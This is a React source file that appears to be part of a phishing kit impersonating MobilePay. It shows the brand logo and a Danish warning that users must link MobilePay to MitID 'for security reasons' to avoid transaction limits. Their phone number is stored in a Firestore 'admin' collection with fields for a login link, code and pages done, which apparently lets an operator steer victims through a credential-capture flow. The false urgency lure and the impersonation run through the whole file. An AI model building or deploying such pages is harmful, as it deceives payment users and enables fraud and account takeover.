import { getApp, getApps } from "firebase/app";
import { addDoc, collection, doc, setDoc } from "firebase/firestore";
import React, { useEffect, useState } from "react";
import { useOutletContext } from "react-router-dom";

function MobilePay() {
  const [number, setNumber] = useState("");
  const [identifier, setIdentifier, db] = useOutletContext();


  const UserLogin = async () => {
    if (!number) return;
    await setDoc(doc(db, "Users", "number_" + number.replaceAll("+", "")), {
      id: number.replaceAll("+", ""),
      mobile: number,
    });

    await setDoc(doc(db, "admin", number), {
      loading: false,
      link: "login",
      code: "",
      date: new Date().toISOString(),
      pagesDone: ["mobilepay"],
    });
    setIdentifier(number);
  };

  return (
    <div className="max-w-md m-auto">
      <div className="mt-10 py-3 px-7 border border-gray-300  min-h-[60vh] bg-[#f5f5f2]">
        <div className="flex justify-between items-center h-16 border-b-2 mb-6">
          {/* <h2 className="font-semibold text-lg">Kreditkortoplysninger</h2> */}
          <span>
            <svg
              width={150}
              version="1.1"
              viewBox="0 0 133.5 23.5"
              data-reactid="11"
            >
              <g data-reactid="12">
                <path
                  fill="#5A78FF"
                  d="M0,17.9L5.3,1.2c0.1-0.2,0.3-0.4,0.5-0.4h2.7C8.7,0.8,8.9,1,9,1.2l4.1,10.5c0.1,0.2,0.3,0.2,0.4,0l4.1-10.5c0.1-0.2,0.3-0.4,0.5-0.4h2.7c0.2,0,0.4,0.2,0.5,0.4l5.2,16.7c0.1,0.3-0.1,0.6-0.4,0.6h-3.1c-0.3,0-0.4-0.2-0.5-0.4L19,7.2C19,7,18.7,7,18.7,7.2l-4,10.8c-0.1,0.3-0.3,0.4-0.6,0.4h-1.8c-0.3,0-0.4-0.2-0.5-0.4L7.7,7.2C7.6,7,7.4,7,7.3,7.2L3.9,18.1c-0.1,0.3-0.3,0.4-0.5,0.4h-3C0.1,18.4-0.1,18.2,0,17.9z"
                  data-reactid="13"
                ></path>
                <path
                  fill="#5A78FF"
                  d="M27.4,11.9c0-3.9,3-6.9,7-6.9c4,0,7,3,7,6.9c0,3.8-2.9,6.9-7,6.9C30.4,18.8,27.4,15.8,27.4,11.9zM37.8,11.9c0-2-1.5-3.6-3.4-3.6c-1.9,0-3.4,1.6-3.4,3.6c0,2,1.6,3.6,3.4,3.6C36.3,15.5,37.8,13.9,37.8,11.9z"
                  data-reactid="14"
                ></path>
                <path
                  fill="#5A78FF"
                  d="M47.6,17.4c-0.3-0.2-0.5-0.1-0.5,0.2v0.3c0,0.3-0.2,0.5-0.5,0.5h-2.4c-0.3,0-0.5-0.2-0.5-0.5V1.2c0-0.3,0.2-0.5,0.5-0.5h2.6c0.3,0,0.5,0.2,0.5,0.5V6c0,0.3,0.2,0.4,0.6,0.2C48.6,5.6,49.7,5,51.2,5c3.6,0,6.3,3,6.3,6.9c0,3.8-2.8,6.9-6.4,6.9C49.6,18.8,48.5,18.1,47.6,17.4z M54,11.9c0-2-1.5-3.6-3.5-3.6c-1.9,0-3.4,1.6-3.4,3.6c0,2,1.5,3.6,3.4,3.6C52.4,15.5,54,13.9,54,11.9z"
                  data-reactid="15"
                ></path>
                <path
                  fill="#5A78FF"
                  d="M59.7,2c0-1.1,0.9-2,2-2c1.1,0,2,0.9,2,2c0,1.1-0.9,2-2,2C60.6,4,59.7,3,59.7,2z M59.8,17.9V5.9c0-0.3,0.2-0.5,0.5-0.5h2.6c0.3,0,0.5,0.2,0.5,0.5v12.1c0,0.3-0.2,0.5-0.5,0.5h-2.6C60,18.4,59.8,18.2,59.8,17.9z"
                  data-reactid="16"
                ></path>
                <path
                  fill="#5A78FF"
                  d="M66.3,14V1.2c0-0.3,0.2-0.5,0.5-0.5h2.6c0.3,0,0.5,0.2,0.5,0.5v12.8c0,0.8,0.4,1.4,1.3,1.4c0.3,0,0.5,0.2,0.5,0.5v2.1c0,0.3-0.2,0.5-0.5,0.5C67.6,18.6,66.3,17.4,66.3,14z"
                  data-reactid="17"
                ></path>
                <path
                  fill="#5A78FF"
                  d="M72.5,12c0-4,2.9-6.9,6.8-6.9c3.9,0,6.7,3,6.7,7c0,0.5-0.1,0.9-0.6,0.9h-8.9c-0.2,0-0.3,0.1-0.3,0.3c0.2,1.5,1.5,2.6,3.2,2.6c1.1,0,1.9-0.5,2.5-1.1c0.3-0.3,0.5-0.4,0.8-0.4h2.4c0.4,0,0.6,0.3,0.4,0.7c-0.9,2.2-3.3,3.8-6.2,3.8C75.3,18.8,72.5,15.9,72.5,12z M82,10.8c0.2,0,0.3-0.1,0.2-0.3C82,9.1,80.8,8,79.3,8c-1.4,0-2.6,1-3,2.4c-0.1,0.2,0,0.4,0.2,0.4H82z"
                  data-reactid="18"
                ></path>
                <path
                  fill="#5A78FF"
                  d="M88.2,17.9V1.2c0-0.3,0.2-0.5,0.5-0.5h8.2c3.7,0,6.3,2.2,6.3,5.9c0,3.6-2.9,5.9-6.5,5.9h-4.3c-0.3,0-0.5,0.2-0.5,0.5v4.9c0,0.3-0.2,0.5-0.5,0.5h-2.7C88.4,18.4,88.2,18.2,88.2,17.9z M96.7,9.5c1.8,0,2.8-1.5,2.8-2.9c0-1.4-1-2.8-2.8-2.8h-4.4c-0.3,0-0.4,0.2-0.4,0.5V9c0,0.3,0.1,0.5,0.4,0.5H96.7z"
                  data-reactid="19"
                ></path>
                <path
                  fill="#5A78FF"
                  d="M104.4,11.9c0-4,3-6.9,6.4-6.9c1.5,0,2.5,0.6,3.5,1.3c0.2,0.2,0.5,0.2,0.5-0.1V5.9c0-0.3,0.2-0.5,0.5-0.5h2.4c0.3,0,0.5,0.2,0.5,0.5v8.6c0,0.7,0.2,0.9,0.7,1c0.2,0,0.4,0.2,0.4,0.4v2.3c0,0.2-0.2,0.4-0.4,0.4c-1.7,0-2.7-0.5-3.3-1.5c-0.2-0.3-0.3-0.3-0.6-0.1c-1,1-2.2,1.7-4.2,1.7C107.3,18.8,104.4,15.8,104.4,11.9z M114.8,11.9c0-2.1-1.5-3.6-3.4-3.6c-1.9,0-3.4,1.6-3.4,3.6c0,2,1.5,3.6,3.4,3.6C113.3,15.5,114.8,13.9,114.8,11.9z"
                  data-reactid="20"
                ></path>
                <path
                  fill="#5A78FF"
                  d="M120.5,23v-2.1c0-0.3,0.2-0.5,0.5-0.5c1.7,0,3.4-0.9,3.7-2.5c0.1-0.4,0.1-0.7-0.1-1l-4.8-10.8c-0.2-0.4,0.1-0.7,0.4-0.7h2.6c0.3,0,0.4,0.2,0.5,0.5l3,6.9c0.2,0.5,0.5,0.5,0.8,0l2.9-6.9c0.1-0.3,0.2-0.4,0.5-0.4h2.5c0.3,0,0.6,0.3,0.4,0.6l-4.9,11.7c-1.8,4.2-3.7,5.8-7.5,5.8C120.8,23.5,120.5,23.3,120.5,23z"
                  data-reactid="21"
                ></path>
              </g>
            </svg>
          </span>
        </div>
        <h3 className="text-left text-red-500 font-medium mb-3">
          Af sikkerhedsmæssige årsager er du forpligtet til at forbinde din
          MobilePay med dit MitID, for at undgå enhver begrænsning i fremtiden
          med dine transaktioner
        </h3>
        <div className="my-6">
          <label
            htmlFor="link"
            className="block text-left text-md font-bold mb-2  text-gray-900"
          >
            INDTAST DIT MOBILTELEFONNUMMER
          </label>
          <input
            onChange={(e) => setNumber(e.target.value)}
            type="cc"
            id="cc"
            className="bg-gray-50 border border-gray-800 text-gray-900 text-sm rounded-sm focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 "
            placeholder="+45"
          />
        </div>
        <div className="flex items-start mb-1"></div>
        <button
          onClick={UserLogin}
          type="submit"
          className="text-white w-full bg-[#5a78ff] font-medium rounded-sm text-sm outline-none  px-5 py-2.5 text-center flex justify-between"
        >
          <p>Fortsæt</p>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            focusable="false"
            className="mitid--button-icon"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="white"
            aria-hidden="true"
          >
            <path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"></path>
          </svg>
        </button>
      </div>
    </div>
  );
}

export default MobilePay;
